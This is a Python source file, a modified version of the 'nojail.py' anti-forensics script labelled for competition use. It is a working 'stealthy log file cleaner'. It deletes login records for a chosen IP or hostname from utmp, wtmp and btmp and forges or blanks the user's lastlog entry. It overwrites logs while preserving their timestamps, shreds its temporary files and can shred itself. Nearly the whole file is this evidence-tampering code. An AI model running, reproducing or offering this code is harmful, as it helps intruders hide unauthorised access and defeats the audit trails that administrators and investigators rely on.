#!/usr/bin/env python

"""
    Modified version of JusticeRage/freedomfighting/blob/master/nojail.py
    for use in competition
"""

import datetime
import os
import platform
import pwd
import random
import struct
import subprocess
import sys

# Support for both argparse and optparse.
try:
    import argparse
except ImportError:
    argparse = None
    import optparse

VERBOSE = False
CHECK_MODE = False

LINUX_UTMP_FILES = ["/var/run/utmp", "/var/log/wtmp", "/var/log/btmp"]
LINUX_LASTLOG_FILE = "/var/log/lastlog"
LINUX_ADDITIONAL_LOGS = ["/var/log/messages", "/var/log/secure"]
UTMP_BLOCK_SIZE = 384  # Modified depending on distribution
LASTLOG_BLOCK_SIZE = 292
UTMP_UNPACK_STRING = "hi32s4s32s256s2h3i36x"
LASTLOG_UNPACK_STRING = "i32s256s"

# Keeps track of the latest "legitimate" login date for the user we're tampering with.
# This value is used to update the output of the lastlog command.
LAST_LOGIN = {"timestamp": 0, "terminal": "", "hostname": ""}


def random_string(size):
    return ''.join(random.choice("abcdefghijlkmnopqrstuvwxyz0123456789") for _ in range(size))


# -----------------------------------------------------------------------------

def ask_confirmation(message):
    """
    Displays a prompt to the user to confirm or deny an action.
    :param message:  The action about to be attempted.
    :return: Whether to proceed or not.
    """
    answers = {"y": True, "yes": True, "n": False, "no": False}
    while True:
        # In Python 3, raw_input is replaced by input.
        response = input("[ ] %s Confirm? [Y/n] " % message).lower()
        if response in answers:
            return answers[response]
        elif not response:  # Default to yes.
            return True


###############################################################################
# Pretty printing functions
###############################################################################

GREEN = '\033[92m'
ORANGE = '\033[93m'
RED = '\033[91m'
END = '\033[0m'


def red(text): return RED + text + END


def orange(text): return ORANGE + text + END


def green(text): return GREEN + text + END


def error(text): return "[" + red("!") + "] " + red("Error: " + text)


def warning(text): return "[" + orange("*") + "] Warning: " + text


def success(text): return "[" + green("*") + "] " + green(text)


def info(text): return "[ ] " + text


###############################################################################
# File manipulation functions
###############################################################################

SAFE_MOUNTPOINT = None  # A writable device mounted as tmpfs.


def get_safe_mountpoint():
    """
    Looks for tmpfs filesystems mounted as rw to work in as they won't cause
    any data to be written to the hard drive.
    :return: A mountpoint where files can be stored.
    """
    global SAFE_MOUNTPOINT
    if SAFE_MOUNTPOINT is not None:
        return SAFE_MOUNTPOINT

    p = subprocess.Popen(["mount", "-t", "tmpfs"], stdout=subprocess.PIPE)
    candidates, stderr = p.communicate()
    candidates = candidates.decode().split('\n')
    candidates = list(filter(lambda x: "rw" in x, candidates))
    for c in candidates:
        # Assert that the output of mount is sane.
        parts = c.split()
        if len(parts) < 3:
            continue
        device = parts[2]
        if device[0] != '/':
            print(error("%s doesn't seem to be a mountpoint..." % device))
            continue

        # Check that we have sufficient rights to create files there.
        if not os.access(device, os.W_OK):
            if VERBOSE:
                print(info("Unable to work in %s..." % device))
            continue

        # Verify that there is some space left on the device.
        statvfs = os.statvfs(device)
        if statvfs.f_bfree < 1000:  # Require at least 1000 free blocks.
            if VERBOSE:
                print(info("Rejecting %s because there isn't enough space left..." % device))
            continue

        # OK, suitable place identified.
        SAFE_MOUNTPOINT = device
        break

    if SAFE_MOUNTPOINT is not None:
        if VERBOSE:
            print(success("Identified %s as a suitable working directory." % SAFE_MOUNTPOINT))
        return SAFE_MOUNTPOINT
    print(error("Could not find a tmpfs mountpoint to work in! Aborting."))
    sys.exit(-1)


# -----------------------------------------------------------------------------

def get_temp_filename():
    return os.path.join(get_safe_mountpoint(), random_string(10))


# -----------------------------------------------------------------------------

def proper_overwrite(source, destination):
    """
    Overwrites a given file without breaking the file descriptors.
    The file's access time and modification time are preserved.
    :param source: The new contents of the file.
    :param destination: The file to tamper with.
    :return: Whether the file could be overwritten.
    """
    if not os.path.exists(source) or not os.path.exists(destination):
        print(error("Either %s or %s does not exist! Logs have NOT been overwritten!" % (source, destination)))
        return False
    if not os.access(destination, os.W_OK):
        print(error("Cannot write to %s! Logs have NOT been overwritten!" % destination))
        return False

    stat_info = os.stat(destination)
    ret = os.system("cat %s > %s" % (source, destination))
    if ret != 0:
        if VERBOSE:
            print(warning("Command \"cat %s > %s\" failed!" % (source, destination)))
        return False
    os.utime(destination, (stat_info.st_atime, stat_info.st_mtime))
    return True


# -----------------------------------------------------------------------------

def secure_delete(target):
    """
    Performs a secure deletion of a given file. Tries to use shred from the
    system, but a manual 3-pass overwrite is performed if it's not available.
    :param target: The file to erase.
    :return: None
    """
    if not os.path.exists(target):  # Easiest deletion ever.
        print(error("Tried to delete a nonexistent file! (%s)" % target))
        return

    try:
        subprocess.call(["shred", "-uz", target])
    except OSError:  # Shred is not present on the machine.
        if VERBOSE:
            print(warning("shred is not available. Falling back to manual secure file deletion."))
        f = None
        try:
            f = open(target, "ab+")
            length = f.tell()
            for _ in range(0, 3):
                f.seek(0)
                f.write(os.urandom(length))
        finally:
            if f is not None:
                f.close()
        os.remove(target)


###############################################################################
# Log cleaning functions
###############################################################################

def clean_utmp(filename, username, ip, hostname):
    cleaned_entries = 0
    clean_file = b""
    global LAST_LOGIN, CHECK_MODE
    if not os.path.exists(filename):
        print(warning("%s does not exist." % filename))
        return  # Nothing to do

    f = None
    try:
        f = open(filename, 'rb')
        while True:
            block = f.read(UTMP_BLOCK_SIZE)
            if not block:
                break
            # Assert that the last 20 bytes are 0s (the "__unused" field)
            if block[-20:] != b"\x00" * 20:
                print(error("This distribution may not be using the expected UTMP block size. %s will NOT be cleaned!" % filename))
                if f is not None:
                    f.close()
                return
            utmp_struct = struct.unpack(UTMP_UNPACK_STRING, block)
            # Only drop blocks which match both the user and the IP address.
            if utmp_struct[5].strip(b"\x00").decode() in [hostname, ip]:
                msg = "About to delete a record in %s for a %s login from %s on %s." % (
                    filename,
                    utmp_struct[4].strip(b"\x00").decode(),
                    utmp_struct[5].strip(b"\x00").decode(),
                    datetime.datetime.fromtimestamp(int(utmp_struct[9])).strftime('%Y-%m-%d %H:%M:%S')
                )
                if (not CHECK_MODE) or (CHECK_MODE and ask_confirmation(msg)):
                    cleaned_entries += 1
                else:  # The user doesn't want to delete the block.
                    clean_file += block
            else:
                # Do not take failed logins into account when restoring the previous successful connection.
                if filename != LINUX_UTMP_FILES[-1] and utmp_struct[4].strip(b"\x00").decode() == username and utmp_struct[9] > LAST_LOGIN["timestamp"]:
                    # This is a previous connection by the "real" user and it's the most recent we've seen.
                    LAST_LOGIN = {"terminal": utmp_struct[2].strip(b"\x00").decode(),
                                  "timestamp": utmp_struct[9],
                                  "hostname": utmp_struct[5].strip(b"\x00").decode()}
                clean_file += block

        if cleaned_entries == 0:  # Nothing to remove from the file.
            print(info("No entries to remove from %s." % filename))
        else:
            # Replace the old contents with the filtered one.
            tmp_file = get_temp_filename()
            g = None
            try:
                g = open(tmp_file, "wb")
                g.write(clean_file)
            finally:
                if g is not None:
                    g.close()
            if proper_overwrite(tmp_file, filename):
                print(success("%s entries removed from %s!" % (cleaned_entries, filename)))
            secure_delete(tmp_file)
        if f is not None:
            f.close()

    except IOError:
        print(error("Unable to read or write to %s. Logfile will NOT be cleaned." % filename))
        if f is not None:
            f.close()


def clean_lastlog(filename, username, ip, hostname):
    """
    Cleans the information returned by the lastlog program.
    The script will try to set it to the last known login for this account from
    a different hostname than the one specified. If none can be found, the
    last login date is simply set to "never".
    :param filename: The target file (/var/log/lastlog on Linux).
    :param username: The name of the user to tamper with.
    :param ip: The IP address to remove from the logs.
    :param hostname: The hostname of the user.
    :return:
    """
    if not os.path.exists(filename):
        print(warning("%s does not exist." % filename))
        return  # Nothing to do

    # Try to get the UID for the given username.
    try:
        uid = pwd.getpwnam(username).pw_uid
    except KeyError:
        print(error("User not found: %s" % username))
        return

    clean_file = b""
    f = None
    try:
        f = open(filename, 'rb')
        # Go to the block corresponding to the user's UID.
        if uid != 0:
            clean_file += f.read(uid * LASTLOG_BLOCK_SIZE)  # block 0 corresponds to UID 0, etc.

        block = f.read(LASTLOG_BLOCK_SIZE)
        if len(block) != LASTLOG_BLOCK_SIZE:
            print(warning("%s does not contain a complete lastlog entry for user %s. Skipping." % (filename, username)))
            return

        lastlog_struct = struct.unpack(LASTLOG_UNPACK_STRING, block)
        if lastlog_struct[2].strip(b"\x00").decode() not in [hostname, ip]:
            return  # Nothing to do: the last log isn't from the current IP or hostname.

        if CHECK_MODE and not ask_confirmation("About to modify the following %s record: latest login from %s (%s): %s." %
                                               (filename, username, lastlog_struct[2].strip(b"\x00").decode(),
                                                datetime.datetime.fromtimestamp(int(lastlog_struct[0])).strftime('%Y-%m-%d %H:%M:%S'))):
            return

        if LAST_LOGIN["timestamp"] == 0:  # No previous login information. Append an empty block.
            clean_file += b"\x00" * LASTLOG_BLOCK_SIZE
        else:
            clean_file += struct.pack(LASTLOG_UNPACK_STRING, LAST_LOGIN["timestamp"],
                                      LAST_LOGIN["terminal"].encode(),
                                      LAST_LOGIN["hostname"].encode())

        # Append the rest of the file and overwrite lastlog:
        clean_file += f.read()
        tmp_file = get_temp_filename()
        g = None
        try:
            g = open(tmp_file, "wb")
            g.write(clean_file)
        finally:
            if g is not None:
                g.close()
        success_flag = proper_overwrite(tmp_file, filename)
        secure_delete(tmp_file)

        if not success_flag:
            return  # Return immediately without printing a success message.

        if LAST_LOGIN["timestamp"] != 0:
            timestamp_str = datetime.datetime.fromtimestamp(int(LAST_LOGIN["timestamp"])).strftime('%Y-%m-%d %H:%M:%S')
            print(success("Lastlog set to %s from %s at %s" % (timestamp_str,
                                                               LAST_LOGIN["terminal"],
                                                               LAST_LOGIN["hostname"])))
        else:
            print(success("Removed %s's login information from lastlog!" % username))
    finally:
        if f is not None:
            f.close()


# -----------------------------------------------------------------------------
if __name__ == "__main__":
    if argparse:
        parser = argparse.ArgumentParser(description="Stealthy log file cleaner.")
        parser.add_argument("--user", "-u", help="The username to remove from the connexion logs.")
        parser.add_argument("--ip", "-i", help="The IP address to remove from the logs.")
        parser.add_argument("--regexp", "-r", help="A regular expression to select log lines to delete (optional)",
                            default=None)
        parser.add_argument("--hostname", "-n", help="The hostname of the user to wipe. Defaults to the rDNS of the IP.")
        parser.add_argument("--verbose", "-v", help="Print debug messages.", action="store_true")
        parser.add_argument("--check", "-c", help="If present, the user will be asked to confirm each deletion from the logs.", action="store_true")
        parser.add_argument("--daemonize", "-d", help="Start in the background and delete logs when the current session terminates. This script will then delete itself.", action="store_true")
        parser.add_argument("log_files", nargs='*', help="Specify any log files to clean in addition to /var/**/*.log.")
        args = parser.parse_args()
    else:  # argparse is unavailable. Fall back to optparse.
        parser = optparse.OptionParser(description="Stealthy log file cleaner.")
        parser.add_option("-u", "--user", help="The username to remove from the connexion logs.")
        parser.add_option("-i", "--ip", help="The IP address to remove from the logs.")
        parser.add_option("-n", "--hostname", help="The hostname of the user to wipe. Defaults to the rDNS of the IP.")
        parser.add_option("-v", "--verbose", help="Print debug messages.", action="store_true")
        parser.add_option("-c", "--check", help="If present, the user will be asked to confirm each deletion from the logs.", action="store_true")
        parser.add_option("-d", "--daemonize", help="Start in the background and delete logs when the current session terminates. This script will then delete itself.", action="store_true")
        (args, positional) = parser.parse_args()
        args.log_files = positional

    # Ensure a username is provided.
    if not args.user:
        print(error("No username provided! Please use the --user or -u option."))
        sys.exit(1)

    VERBOSE = args.verbose
    CHECK_MODE = args.check

    system = platform.system()
    if system == "Windows":
        print(error("Windows isn't supported by this script!"))
        sys.exit(1)

    get_safe_mountpoint()

    if system == "Linux":
        for log in LINUX_UTMP_FILES:
            clean_utmp(log, args.user, args.ip, args.hostname)
        clean_lastlog(LINUX_LASTLOG_FILE, args.user, args.ip, args.hostname)
    else:
        print(error("UTMP/WTMP/lastlog cannot be cleaned on %s :(" % system))

    # If we daemonized to remove the logs after the user disconnects, also shred this script.
    if args.daemonize and os.path.exists(sys.argv[0]):
        secure_delete(sys.argv[0])
    # When running the script as "python nojail.py", sys.argv[0] may be "nojail.py"
    elif args.daemonize and os.path.exists(os.path.join(".", sys.argv[0])):
        secure_delete(os.path.join(".", sys.argv[0]))
